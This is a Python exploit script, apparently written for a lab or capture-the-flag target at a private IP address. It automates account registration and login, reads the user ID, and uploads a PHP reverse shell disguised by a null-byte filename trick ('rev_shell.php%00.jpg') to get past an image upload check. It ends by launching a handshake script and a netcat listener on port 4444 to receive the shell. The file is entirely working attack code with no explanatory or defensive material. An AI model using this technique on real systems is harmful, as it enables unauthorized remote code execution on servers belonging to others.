import requests as req
from requests import Session
import time
import sys
import os
import subprocess
import re

#relative path to file
dirname = os.path.dirname(__file__)
shelldir = os.path.join(dirname, 'rev_shell.php%00.jpg')

#register with details being unix time
name = str(int(time.time()))
payload = {'username': name, 'firstname': name, 'lastname': name, 'password': name, 'againpass': name}
resp = req.post(url="http://10.14.4.6/users/register.php",data=payload)
print("Registered as: " + name)

#log in with persistant session
payload1 = {'username': name, 'password': name}
s = req.Session()
logged_in = s.get("http://10.14.4.6/")
resp1 = s.post("http://10.14.4.6/users/login.php",payload1)
print("Logged in as: " + name)

#find user id
cut = resp1.text.find("/users/view.php?userid=")
idstr = resp1.text[int(cut)+20:len(resp1.text)-450]
idstr = re.sub("[^0-9]", "",idstr)
print("User ID as: " + idstr)

#upload files
thesefiles = [('pic',('rev_shell.php%00.jpg', open(shelldir, 'rb'), 'image/jpg'))]
params={'MAX_FILE_SIZE': '10485760','tag': name, 'name': name+'rev_shell.php', 'title': name, 'price': '0', 'submit': 'Upload File'}
resp1 = s.post(url="http://10.14.4.6/pictures/upload.php", files=thesefiles, data=params)
print("Shell uploaded: " + name + "rev_shell.php")

#establish handshake
os.system('gnome-terminal -x python filecathandshake.py ' +name+" "+idstr)
os.system('nc -nlvp 4444')